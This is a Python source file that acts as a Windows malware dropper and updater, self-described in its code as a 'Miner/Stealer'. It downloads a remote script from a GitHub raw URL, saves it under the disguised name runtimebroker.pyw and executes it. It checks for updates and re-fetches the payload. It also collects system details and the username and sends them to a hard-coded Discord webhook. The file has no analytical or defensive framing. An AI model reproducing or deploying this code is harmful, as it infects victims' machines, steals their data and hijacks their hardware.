try:
    import os, sys, http.client as httplib, urllib.request, time, requests, wmi
except ImportError:
    pyd = str(sys.executable)
    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/Benjamin/requirements.txt")

rawrepo = "https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli"
pd = 'C:/Users/Public/Documents/Benjamin'

def connection():
    conn = httplib.HTTPConnection("www.google.com", timeout=3)
    try:
        conn.request("HEAD", "/")
        conn.close()
        return True
    except:
        return False

if (connection() == False):
	os._exit(1)

def setup():
    if not os.path.exists(pd):
        os.makedirs(pd)    
    urllib.request.urlretrieve(rawrepo + '/main/areureal.py', '{}/runtimebroker.pyw'.format(pd))
    urllib.request.urlretrieve(rawrepo + '/main/requirements.txt', '{}/requirements.txt'.format(pd))
    urllib.request.urlretrieve(rawrepo + '/main/version', '{}/version'.format(pd))
    os.popen("{}/runtimebroker.pyw".format(pd))
    os._exit(1)
    
    
def simplog():
    computer = wmi.WMI()
    computer_info = computer.Win32_ComputerSystem()[0]
    os_info = computer.Win32_OperatingSystem()[0]
    proc_info = computer.Win32_Processor()[0]

    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
    os_version = ' '.join([os_info.Version, os_info.BuildNumber])
    system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
  
    data = {
        "content" : "**Miner/Stealer Updated.**\n```> OS Name: {}\n> OS Version: {}\n> CPU: {}\n> RAM: {} GB\n> Graphics Card-1: {}\n> Graphics Card-2: {}```".format(os_name, os_version, proc_info.Name, system_ram, gpu.Name, gpu0.Name),
        "username" : "{}".format(computer_info.Username)
        }         
    requests.post("https://discord.com/api/webhooks/1036225289031786526/_u6C8DVHJOZuhSy3SkaBB6ZJIIN_516bm2DXqlnQKigHP80vmCTPc8lz9znrukeZBT7T", json = data)
    time.sleep(3)

    
def checkupdate():
    r = requests.get(rawrepo + "/main/version")
    gitver = r.text
    with open('{}/version'.format(pd)) as f:
        curver = f.readline()
    if(gitver != curver):
        urllib.request.urlretrieve(rawrepo + '/main/areureal.py', '{}/runtimebroker.pyw'.format(pd))
        urllib.request.urlretrieve(rawrepo + '/main/requirements.txt', '{}/requirements.txt'.format(pd))
        urllib.request.urlretrieve(rawrepo + '/main/version', '{}/version'.format(pd))
        simplog()
        os.popen("{}/runtimebroker.pyw".format(pd))
        os._exit(1)
    else:
        return False

if (os.name == "nt"):
    if not os.path.exists('{}/runtimebroker.pyw'.format(pd)):
        setup()
    cu = checkupdate()
    if(cu == False):
        os.popen("{}/runtimebroker.pyw".format(pd))
        os._exit(1)
    